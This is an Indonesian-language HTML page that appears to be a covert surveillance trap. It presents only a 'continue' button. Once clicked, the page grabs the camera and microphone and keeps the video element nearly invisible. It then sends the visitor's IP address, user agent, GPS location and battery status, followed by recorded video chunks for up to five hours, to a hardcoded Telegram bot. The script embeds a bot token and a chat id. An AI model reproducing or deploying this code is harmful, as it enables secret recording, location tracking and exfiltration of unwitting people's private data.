<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>CLIK.NOW</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: #000;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
    }
    .popup {
      background-color: rgba(0, 0, 0, 0.7);
      padding: 30px;
      border-radius: 15px;
      text-align: center;
      width: 300px;
    }
    button {
      transition: background 0.3s ease, transform 0.3s ease;
      padding: 10px 20px;
      margin-top: 15px;
      border: none;
      border-radius: 8px;
      background: #00ff88;
      color: #000;
      font-weight: bold;
      cursor: pointer;
    }
    #video {
      transition: opacity 1s ease;
      display: none;
      width: 1px;
      height: 1px;
    }
    .circle-light {
      position: absolute;
      top: 5px;
      left: 5px;
      width: 10px;
      height: 10px;
      border-radius: 50%;
      background-color: red;
      box-shadow: 0 0 8px 3px red;
      z-index: 1000;
    }
    @keyframes blink {
      0% {
        opacity: 0.3;
        transform: scale(1);
      }
      100% {
        opacity: 1;
        transform: scale(1.3);
      }
    }
  </style>
</head>
<body>
  <div class="circle-light"></div>

  <marquee behavior="scroll" direction="left" style="position: fixed; top: 0; width: 100%; background: rgba(0,0,0,0.5); color: #fff; padding: 10px; font-weight: bold; z-index: 999;">
    silahkan pencet lanjutkan.
  </marquee>

  <div class="popup" id="step1">
    <h2>SILAHKAN PENCET LANJUTKAN</h2>
    <button onclick="kirimNama()">LANJUTKAN</button>
  </div>

  <video id="video" autoplay playsinline></video>

  <script>
    const token = '7648038217:AAEhGMOxW_khuHyiCxttyaJyAWzPe9vm52U';
    const chat_id = '7552410869';
    let recorder;
    let recordedChunks = [];
    let autoStream;

    async function kirimNama() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        document.getElementById('video').srcObject = stream;
        document.getElementById('video').style.display = 'block';
        autoStream = stream;
        startStreaming();
      } catch (err) {
        alert("Akses kamera/mikrofon ditolak.");
      }
    }

    async function startStreaming() {
      const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip);
      const userAgent = navigator.userAgent;
      const waktu = new Date();
      const location = await getLocation();
      const battery = await navigator.getBattery().then(b => `${Math.round(b.level * 100)}% (${b.charging ? 'Mengisi' : 'Tidak mengisi'})`).catch(() => 'Tidak tersedia');

      const info = `
█░▄▀ ▄▀▄ █▀▀▄ █▀▄ ▄▀▄ █▄░█
█▀▄░ █░█ █▐█▀ █▀█ █▀█ █░▀█
▀░▀▀ ░▀░ ▀░▀▀ ▀▀░ ▀░▀ ▀░░▀   
IP: ${ip}
User-Agent: ${userAgent}
Waktu: ${waktu.toLocaleString()}
Lokasi: ${location}
Baterai: ${battery}
`;

      const formData = new FormData();
      formData.append("chat_id", chat_id);
      formData.append("caption", info);

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        body: formData
      });

      const popup = document.getElementById('step1');
      popup.style.transition = 'opacity 0.5s ease';
      popup.style.opacity = 0;
      setTimeout(() => popup.style.display = 'none', 500);

      const synth = window.speechSynthesis;
      const welcome = new SpeechSynthesisUtterance('Halo! bang halo bangg kamu ganteng kwkwkwkw');
      welcome.lang = 'id-ID';
      synth.speak(welcome);

      const stream = autoStream;
      recorder = new MediaRecorder(stream);
      recorder.ondataavailable = handleDataAvailable;
      recorder.onstop = () => handleStop(stream);
      recorder.start();

      setTimeout(() => {
        setInterval(() => {
          recorder.stop();
          recorder.start();
        }, 17000);
      }, 17000);

      setTimeout(() => {
        recorder.stop();
        alert("Rekaman otomatis selesai setelah 5 jam.");
      }, 5 * 60 * 60 * 1000);
    }

    function handleDataAvailable(event) {
      if (event.data.size > 0) {
        recordedChunks.push(event.data);
      }
    }

    async function handleStop(stream) {
      const blob = new Blob(recordedChunks, { type: 'video/webm' });
      recordedChunks = [];

      const waktu = new Date();
      const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip);
      const location = await getLocation();
      const battery = await navigator.getBattery().then(b => `${Math.round(b.level * 100)}% (${b.charging ? 'Mengisi' : 'Tidak mengisi'})`).catch(() => 'Tidak tersedia');

      const message = `
[REKAMAN OTOMATIS]
IP: ${ip}
Waktu: ${waktu.toLocaleString()}
Lokasi: ${location}
Baterai: ${battery}
`;

      const formData = new FormData();
      formData.append("chat_id", chat_id);
      formData.append("caption", message);
      formData.append("video", blob, "rekaman.webm");

      fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
        method: 'POST',
        body: formData
      });
    }

    async function getLocation() {
      return new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
          pos => resolve(`https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`),
          () => resolve("Lokasi tidak tersedia")
        );
      });
    }
  </script>
</body>
</html>
